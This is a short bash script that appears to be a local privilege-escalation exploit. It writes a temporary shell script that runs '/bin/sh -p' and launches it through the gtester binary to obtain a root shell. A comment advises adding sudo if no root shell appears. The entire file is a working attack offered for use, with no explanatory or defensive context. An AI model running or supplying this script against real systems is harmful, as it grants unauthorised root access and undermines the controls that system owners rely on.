#!/bin/bash

echo -e "If no root shell invoked then try sudo inside this file at last line."

TF=$(mktemp)
echo '#!/bin/sh -p' > $TF
echo 'exec /bin/sh -p 0<&1' >> $TF
chmod +x $TF
gtester -q $TF # sudo gtester +x $TF


